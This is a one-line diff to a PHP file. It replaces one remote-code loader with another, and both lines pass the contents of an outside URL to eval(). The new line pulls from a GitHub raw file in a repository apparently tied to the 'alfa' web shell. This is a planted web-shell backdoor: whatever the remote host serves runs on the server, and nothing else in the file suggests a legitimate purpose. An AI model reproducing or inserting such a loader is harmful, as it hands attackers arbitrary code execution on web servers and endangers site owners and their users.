@@ -1,1 +1,1 @@
-<?php eval("?>" . file_get_contents("https://learn.classtrak.in/uploads/cocoo.txt")); ?>
+<?php eval("?>" . file_get_contents("https://raw.githubusercontent.com/zycoder0day/alfa/main/cocot.txt")); ?>
